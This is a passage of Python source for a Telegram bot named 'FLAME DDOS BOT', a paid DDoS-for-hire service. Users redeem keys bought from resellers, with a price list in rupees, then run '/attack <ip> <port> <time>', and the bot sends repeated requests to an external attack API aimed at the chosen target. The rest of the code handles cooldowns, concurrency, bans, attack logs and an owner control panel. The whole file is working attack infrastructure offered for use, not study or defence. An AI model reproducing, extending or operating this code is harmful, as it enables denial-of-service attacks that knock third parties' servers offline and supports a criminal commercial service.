        safe_send_message(message.chat.id, attack_msg, reply_to=message)
        
        api_url_template = API_LIST[0]
        api_url = api_url_template.format(ip=target, port=port, time=duration)
        
        concurrent_limit = get_concurrent_limit()
        success = False
        
        try:
            for i in range(concurrent_limit):
                response = requests.get(api_url, timeout=10)
                print(f"Attack request {i+1} sent: {response.status_code}")
                if response.status_code == 200:
                    success = True
                if i < concurrent_limit - 1:
                    time.sleep(1)
        except Exception as e:
            print(f"Request error: {e}")
            success = False
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
                print(f"✅ Attack {attack_id} removed from active_attacks")
            
            if attack_id in api_in_use:
                slot_freed = api_in_use[attack_id]
                del api_in_use[attack_id]
                print(f"✅ Slot {slot_freed} freed for attack {attack_id}")
            
            now = datetime.now()
            expired = []
            for aid, atk in list(active_attacks.items()):
                if atk['end_time'] <= now:
                    expired.append(aid)
            for aid in expired:
                if aid in active_attacks:
                    del active_attacks[aid]
                if aid in api_in_use:
                    del api_in_use[aid]
        
        clear_global_attack()
        
        cooldown_time = get_user_cooldown_setting()
        set_global_cooldown(cooldown_time)
        
        complete_msg = build_attack_complete_message(target, port, duration)
        safe_send_message(message.chat.id, complete_msg, reply_to=message)
        
        feedback_required = get_setting('feedback_required', True)
        if feedback_required:
            set_pending_feedback(user_id, target, port, duration)
        else:
            safe_send_message(message.chat.id, "✅ You can now start a new attack using /attack command.", reply_to=message)
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        clear_global_attack()
        print(f"Attack error: {e}")

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    feedback_required = get_setting('feedback_required', True)
    if feedback_required and has_pending_feedback(user_id):
        feedback_msg = build_feedback_required_message()
        safe_send_message(message.chat.id, feedback_msg, reply_to=message)
        return
    
    if not has_valid_key(user_id):
        user = users_db.get(user_id)
        if user and user.get('reseller_username'):
            reseller_name = user.get('reseller_username')
            safe_send_message(message.chat.id, f"❌ Key expired!\n\n🔄 For renewal DM: @{reseller_name}", reply_to=message)
        else:
            safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact a reseller to purchase a key.", reply_to=message)
        return
    
    global_cooldown = get_global_cooldown()
    if global_cooldown > 0:
        safe_send_message(message.chat.id, f"⏳ Global cooldown active! Wait: {global_cooldown}s\n\nAnother user just finished an attack. Please wait for cooldown to end.", reply_to=message)
        return
    
    if is_global_attack_active():
        remaining = int((global_attack_end_time - datetime.now()).total_seconds())
        safe_send_message(message.chat.id, f"❌ An attack is already in progress!\n\n⏱️ Time remaining: {remaining}s\n\nPlease try again after this attack finishes.", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /attack <ip> <port> <time>", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    target_addr = f"{target}:{port}"
    if not is_owner(user_id) and get_port_protection() and user_id in user_attack_history:
        if target_addr in user_attack_history[user_id]:
            last_atk_time = user_attack_history[user_id][target_addr]
            if datetime.now() < last_atk_time + timedelta(hours=2):
                safe_send_message(message.chat.id, f"❌ Port {port} is already attacked.", reply_to=message)
                return

    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s", reply_to=message)
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            safe_send_message(message.chat.id, "❌ No free slots available! Please wait.", reply_to=message)
            return
        
        with _attack_lock:
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        set_global_attack_active(duration)
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)

@bot.message_handler(commands=["cancel"])
def cancel_attack_command(message):
    user_id = message.from_user.id
    
    if check_banned(message): return
    
    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                if attack_id in api_in_use:
                    del api_in_use[attack_id]
                found = True
                break
        
        if found:
            clear_global_attack()
            safe_send_message(message.chat.id, "✅ Your active attack has been cancelled!", reply_to=message)
        else:
            safe_send_message(message.chat.id, "❌ You have no active attack to cancel!", reply_to=message)

@bot.message_handler(commands=["myaccess"])
def my_access_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = users_db.get(user_id)
    
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, "❌ You don't have any active access!", reply_to=message)
        return
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, "❌ Your access has expired!", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    reseller_name = user.get('reseller_username', 'None')
    
    access_msg = f"📋 Your Access Details\n\n🔑 Key: `{user['key']}`\n⏳ Time Left: {remaining}\n💼 Reseller: @{reseller_name}\n✅ Status: Active"
    
    safe_send_message(message.chat.id, access_msg, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["plan"])
def plan_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    
    plan_msg = "💰 Pricing Plans\n\n"
    plan_msg += "🔹 12 Hours - ₹25\n"
    plan_msg += "🔹 1 Day - ₹50\n"
    plan_msg += "🔹 3 Days - ₹130\n"
    plan_msg += "🔹 1 Week - ₹250\n"
    plan_msg += "🔹 1 Month - ₹750\n"
    plan_msg += "🔹 1 Season (60 Days) - ₹1250\n\n"
    plan_msg += "Contact a reseller to purchase!"
    
    safe_send_message(message.chat.id, plan_msg, reply_to=message)

@bot.message_handler(content_types=['photo'])
def handle_feedback_photo(message):
    user_id = message.from_user.id
    
    fb = get_pending_feedback(user_id)
    if not fb:
        return
    
    clear_pending_feedback(user_id)
    
    user_name = message.from_user.first_name
    username = message.from_user.username
    
    safe_send_message(message.chat.id, 
        "✅ **Feedback Received!**\n\n"
        "🎉 Thank you for your feedback!\n\n"
        "⚡ You can now start a new attack using /attack command.",
        reply_to=message, parse_mode="Markdown")
    
    try:
        owner_msg = (
            f"📸 **NEW ATTACK FEEDBACK**\n\n"
            f"👤 **User:** {user_name}\n"
            f"📛 **Username:** @{username if username else 'N/A'}\n"
            f"🆔 **ID:** `{user_id}`\n\n"
            f"🎯 **Target:** {fb['target']}:{fb['port']}\n"
            f"⏱️ **Duration:** {fb['duration']}s\n"
            f"🕐 **Time:** {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
        )
        
        bot.send_photo(
            BOT_OWNER, 
            message.photo[-1].file_id, 
            caption=owner_msg,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Failed to forward feedback to owner: {e}")

@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    set_setting('feedback_required', True)
    safe_send_message(message.chat.id, "✅ Feedback requirement ENABLED! Users must send feedback after each attack.", reply_to=message)

@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    set_setting('feedback_required', False)
    safe_send_message(message.chat.id, "✅ Feedback requirement DISABLED! Users can attack without sending feedback.", reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    help_text = '''
👑 OWNER PANEL

🔑 KEY MANAGEMENT:
• /gen <prefix> <time> <count> - Generate keys with custom prefix
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Delete key
• /delexpkey - Delete expired keys
• /trail <hrs> <max> - Trail keys
• /resellertrail <id> <hrs> - Give trail to reseller
• /detrail - Delete all trail keys

👥 USER MANAGEMENT:
• /user <id> - User info
• /allusers - All users
• /extend <id> <time> - Extend time
• /extendall <time> - Extend everyone's time
• /down <id> <time> - Reduce time
• /delexpusr - Delete expired users
• /ban <id> - Ban user
• /unban <id> - Unban user
• /banned - Banned users
• /tban <id> <time> - Temp ban

💼 RESELLER MANAGEMENT:
• /addreseller <id> - Add reseller
• /removereseller <id> - Remove reseller
• /blockreseller <id> - Block
• /unblockreseller <id> - Unblock
• /allresellers - All resellers
• /saldoadd <id> <amt> - Add balance
• /saldoremove <id> <amt> - Remove balance
• /saldo <id> - Check balance
• /userresell <id> - Reseller's users
• /setprice - View/change pricing

📢 BROADCAST:
• /broadcast - Message to all
• /broadcastreseller - Message to resellers
• /broadcastpaid - Message to paid users only

⚡ ATTACK & SETTINGS:
• /attack <ip> <port> <time> - Attack
• /status - Attack status
• /cancel - Cancel active attack
• /concurrent <limit> - Set concurrent limit
• /maxattack <sec> - Set max time
• /cooldown <sec> - Set cooldown
• /blockip <prefix> - Block IP
• /unblockip <prefix> - Unblock IP
• /blockedips - Blocked IPs
• /proton - Port Protection ON
• /protoff - Port Protection OFF
• /feedbackon - Enable feedback requirement
• /feedbackoff - Disable feedback requirement

📊 MONITORING:
• /live - Server stats
• /logs - Attack logs (txt file)
• /dellogs - Delete all logs

🔧 MAINTENANCE:
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    
    total_users = len(users_db)
    active_users = 0
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users += 1
    
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = 0
    for bu in bot_users_db.values():
        if bu.get('last_seen') and bu['last_seen'] > online_threshold:
            online_users += 1
    
    total_resellers = len(resellers_db)
    active_keys = 0
    for key in keys_db.values():
        if not key.get('used'):
            active_keys += 1
    total_keys = len(keys_db)
    
    active_count = get_active_attack_count()
    max_concurrent = get_max_concurrent()
    
    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
    
    response = "═══════════════════════════\n"
    response += "📊 SERVER STATISTICS\n"
    response += "═══════════════════════════\n\n"
    
    response += "🤖 BOT INFORMATION\n"
    response += f"• Uptime: {uptime_str}\n"
    response += f"• Memory Usage: {memory_mb:.1f} MB\n"
    response += f"• CPU Usage: {cpu_percent:.1f}%\n"
    response += f"• Threads: {threads}\n\n"
    
    response += "💻 SYSTEM INFORMATION\n"
    response += f"• System: {system_info}\n"
    response += f"• CPU: {cpu_overall:.1f}% overall\n"
    response += f"• RAM: {ram_percent:.1f}% used ({ram_used:.0f}MB/{ram_total:.0f}MB)\n"
    response += f"• Disk: {disk_percent:.1f}% used\n\n"
    
    response += f"• Active Attacks: {active_count}/{max_concurrent}\n"
    response += f"• Maintenance Mode: {maint_status}\n\n"
    
    response += "📈 BOT DATA\n"
    response += f"• Total Users: {total_users}\n"
    response += f"• Active Users (Keys): {active_users}\n"
    response += f"• Online Users: {online_users}\n"
    response += f"• Resellers: {total_resellers}\n"
    response += f"• Available Keys: {active_keys}\n"
    response += f"• Total Keys: {total_keys}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        response = "═══════════════════════════\n"
        response += "💵 CURRENT PRICING\n"
        response += "═══════════════════════════\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\n⚠️ Usage: /setprice <duration> <price>\n"
        response += "Example: /setprice 1d 60\n"
        response += "═══════════════════════════"
        safe_send_message(message.chat.id, response, reply_to=message)
        return
    
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /setprice <duration> <price>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: /setprice 1d 60", reply_to=message)
        return
    
    duration_key = command_parts[1].lower()
    
    if duration_key not in RESELLER_PRICING:
        safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
        return
    
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            safe_send_message(message.chat.id, "❌ Price cannot be less than 0!", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid price! Enter a number.", reply_to=message)
        return
    
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    
    safe_send_message(message.chat.id, f"✅ Price Updated!\n\n📦 Duration: {RESELLER_PRICING[duration_key]['label']}\n💵 Old Price: {old_price} Rs\n💰 New Price: {new_price} Rs", reply_to=message)

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not attack_logs_db:
        safe_send_message(message.chat.id, "📋 No attack logs found!", reply_to=message)
        return
    
    content = "═══════════════════════════\n"
    content += "       ATTACK LOGS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"Total Attacks: {len(attack_logs_db)}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(attack_logs_db[-100:], 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"END OF LOGS - Total: {len(attack_logs_db)}\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(attack_logs_db)}")

@bot.message_handler(commands=["dellogs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    count = len(attack_logs_db)
    
    if count == 0:
        safe_send_message(message.chat.id, "📋 No logs to delete!", reply_to=message)
        return
    
    attack_logs_db.clear()
    save_all()
    
    safe_send_message(message.chat.id, f"✅ {count} attack logs deleted!", reply_to=message)

@bot.message_handler(commands=["maxattack"])
def max_attack_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nChange: /maxattack <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nChange: /cooldown <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set: {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id): 
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_concurrent_limit()
        safe_send_message(message.chat.id, f"⚙️ Current Concurrent Limit: {current}\n\nChange: /concurrent <count>", reply_to=message)
        return
        
    try:
        new_value = int(command_parts[1])
        if new_value < 1:
            safe_send_message(message.chat.id, "❌ Value cannot be less than 1!", reply_to=message)
            return
        _xcfg(new_value)
        safe_send_message(message.chat.id, f"✅ Concurrent Limit set: {new_value}\n\nNow each attack will call the API {new_value} times (with 1s delay).", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /blockip <ip_prefix>\n\nExample: /blockip 192.168.\nExample: /blockip 10.0.", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Blocked!\n\n🚫 Prefix: `{ip_prefix}`\n\nNow IPs starting with {ip_prefix}* cannot be attacked.", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"ℹ️ `{ip_prefix}` is already blocked!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblockip <ip_prefix>", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP Unblocked!\n\n✅ Prefix: `{ip_prefix}`", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, f"❌ `{ip_prefix}` is not in the blocked list!", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    response += f"\n📊 Total: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot is updating, please wait 10 minutes", reply_to=message)
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {msg}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, "ℹ️ Maintenance mode is already OFF!", reply_to=message)
        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
        
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, "❌ Invalid duration format! Use: 10m, 1h, 1d etc.", reply_to=message)
        return
        
    ban_expiry = datetime.now() + duration_td
    if target_user_id not in users_db:
        users_db[target_user_id] = {}
    
    users_db[target_user_id]['banned'] = True
    users_db[target_user_id]['ban_type'] = 'temporary'
    users_db[target_user_id]['ban_expiry'] = ban_expiry
    save_all()
    
    safe_send_message(message.chat.id, f"🚫 User {resolved_name or target_user_id} has been banned for {label}!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /ban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
    
    if target_user_id not in users_db:
        users_db[target_user_id] = {}
    
    users_db[target_user_id]['user_id'] = target_user_id
    users_db[target_user_id]['username'] = resolved_name
    users_db[target_user_id]['banned'] = True
    users_db[target_user_id]['banned_at'] = datetime.now()
    save_all()
    
    try:
        bot.send_message(target_user_id, "🚫 You have been banned!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ User {display} banned!\n🆔 ID: {target_user_id}", reply_to=message)

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if target_user_id in users_db and users_db[target_user_id].get('banned'):
        users_db[target_user_id]['banned'] = False
        save_all()
        display = f"@{resolved_name}" if resolved_name else str(target_user_id)
        try:
            bot.send_message(target_user_id, "✅ Your ban has been lifted!")
        except:
            pass
        safe_send_message(message.chat.id, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found or already unbanned!", reply_to=message)

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    banned_users = []
    for user in users_db.values():
        if user.get('banned'):
            banned_users.append(user)
    
    if not banned_users:
        safe_send_message(message.chat.id, "📋 No banned users found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🚫 BANNED USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 `{user['user_id']}`\n"
        if user.get('username'):
            response += f"   📛 {user['username']}\n"
    
    response += f"\n═══════════════════════════\n"
    response += f"📊 Total Banned: {len(banned_users)}\n"
    response += "═══════════════════════════"
    
    send_long_message(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 Welcome Owner!

Use /owner to access the full owner panel with all commands.

Here are the commands you can use:

🔸 /start - Start interacting with the bot.
🔸 /attack <ip> <port> <duration> - Launch attack.
🔸 /redeem <key> - Redeem a key.
🔸 /status - Check attack status.
🔸 /cancel - Cancel active attack.
🔸 /myaccess - Check your access.
🔸 /id - Get your ID.
🔸 /plan - View pricing plans.
'''
    elif is_reseller(user_id):
        help_text = '''
💼 RESELLER PANEL

Here are the commands you can use:

🔸 /start - Start interacting with the bot.
🔸 /attack <ip> <port> <duration> - Launch attack.
🔸 /redeem <key> - Redeem a key.
🔸 /status - Check attack status.
🔸 /cancel - Cancel active attack.
🔸 /myaccess - Check your access.
🔸 /id - Get your ID.
🔸 /plan - View pricing plans.
🔸 /mysaldo - Check your balance.
🔸 /prices - View key prices.
🔸 /gen <duration> <count> - Generate keys.
'''
    else:
        help_text = '''
Here are the commands you can use:

🔸 /start - Start interacting with the bot.
🔸 /attack <ip> <port> <duration> - Launch attack.
🔸 /redeem <key> - Redeem a key.
🔸 /status - Check attack status.
🔸 /cancel - Cancel active attack.
🔸 /myaccess - Check your access.
🔸 /id - Get your ID.
🔸 /plan - View pricing plans.

📸 Note: After each attack, you must send a screenshot as feedback before starting another attack.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome Owner, {user_name}!

Use /owner to access the full owner panel.
Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

Here are the commands you can use:

🔸 /start - Start interacting with the bot.
🔸 /attack <ip> <port> <duration> - Launch attack.
🔸 /redeem <key> - Redeem a key.
🔸 /status - Check attack status.
🔸 /cancel - Cancel active attack.
🔸 /myaccess - Check your access.
🔸 /id - Get your ID.
🔸 /plan - View pricing plans.

📸 Feedback Required: After each attack, you must send a screenshot to continue.
'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

print("=" * 60)
print("🔥 FLAME DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
print(f"👑 Owner ID: {BOT_OWNER}")
print("=" * 60)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        time.sleep(3)
